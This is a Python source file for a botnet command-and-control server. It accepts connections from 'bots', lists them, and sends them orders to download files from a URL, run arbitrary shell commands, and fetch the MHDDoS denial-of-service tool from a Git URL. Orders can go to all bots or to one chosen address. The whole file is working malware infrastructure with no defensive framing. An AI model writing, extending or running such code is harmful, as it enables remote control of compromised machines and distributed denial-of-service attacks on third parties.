import socket
import sys
import json
import threading
from termcolor import colored, cprint
from server_config import *

bots_connected = []
command_execution_for = "all"

def input_thread(bots_connected):
    global command_execution_for
    while True:
        raw_inp = input(colored("/>", "yellow"))
        if raw_inp:
            splitted = raw_inp.split()
            cmd = splitted[0]
            args = splitted[1:]
            packet = None
            if cmd == "stop":
                print(colored("Stopped", "red"))
                sock.close()
                break
                exit()
            elif cmd == "download":
                packet = {"action": 2, "url": args[0], "save_path": args[1]}
            elif cmd == "exec":
                packet = {"action": 3, "bash": ' '.join(args)}
            elif cmd == "mhddos_dl":
                packet = {"action": 4, "actual_url": MHDDOS_GIT}
            elif cmd == "viewbots":
                for bot_socket, bot_ip in bots_connected:
                    print(f"{colored(bot_ip[0], 'green')}:{bot_ip[1]}")
            elif cmd == "sb":
                command_execution_for = args[0]

            if packet:
                packet = bytes(json.dumps(packet), encoding="utf-8")
                if command_execution_for == "all":
                    broadcast(packet, bots_connected)
                else:
                    for bot_socket, bot_ip in bots_connected:
                        addr = f"{bot_ip[0]}:{bot_ip[1]}"
                        if addr == command_execution_for:
                            bot_socket.send(packet)


def broadcast(dt, bots_connected):
    for bot, _ in bots_connected:
        bot.send(dt)
        

if __name__ == "__main__":
    try:
        port = int(sys.argv[1])
    except IndexError:
        print("Not enough args")
        exit(1)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    sock.bind(('', port)) 
    sock.listen()
    print(colored('Main server started!', "green"))
    threading.Thread(target=input_thread, args=(bots_connected, )).start()
    while True:
        conn, addr = sock.accept() 
        print(colored('New bot:', "green"), addr)  
        bots_connected.append((conn, addr))
